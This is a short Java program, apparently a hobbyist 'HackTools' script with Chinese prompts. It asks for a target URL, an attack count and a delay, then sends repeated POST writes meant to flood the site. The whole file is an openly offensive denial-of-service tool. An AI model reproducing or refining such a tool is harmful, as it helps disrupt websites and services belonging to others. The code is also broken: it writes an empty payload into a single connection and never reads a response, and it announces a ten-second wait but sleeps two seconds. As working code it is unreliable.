
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;
import java.io.DataOutputStream;
import java.net.MalformedURLException;

 class t3 {
    public static void main(String[] args) throws IOException, InterruptedException {
		Scanner input = new Scanner(System.in);
// 要攻击的URL
		System.out.println("===请输入要攻击的网址===");
		System.out.print("Root@HackTools：>");
		String URL4 = input.next();
// 请求的参数
		String param = "";
		System.out.println("===请输入要攻击的次数===");
// 攻击的次数
		System.out.print("Root@HackTools：>");
		double times = input.nextDouble();
		System.out.println("===请输入攻击的延迟===");
//攻击的延迟
		System.out.print("Root@HackTools：>");
		int time = input.nextInt();
		System.out.println("===攻击网址为"+URL4+"。"+"攻击的次数为"+times+"。延迟为"+time+"===");
		System.out.println("===十秒之后开始攻击===");
		TimeUnit.MILLISECONDS.sleep(2000);
		try {
			URL url4 = new URL(URL4);
			HttpURLConnection connection = (HttpURLConnection) url4.openConnection();
			connection.setRequestMethod("POST");
			connection.setDoInput(true);
			connection.setDoOutput(true);
			connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			connection.setRequestProperty("Connection", "keep-alive");
			connection.setRequestProperty("Charset", "utf-8");
			DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
			for (int i = 0; i < times; i++) {
				// 向服务器发起请求
				outputStream.write(param.getBytes("UTF-8"));
				outputStream.flush();
				System.out.println("===已攻击:"+i+"次===");
				// 对攻击间隔进行延时
				TimeUnit.MILLISECONDS.sleep(time);
			}
			outputStream.close();
			connection.disconnect();
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
    }
	}
	
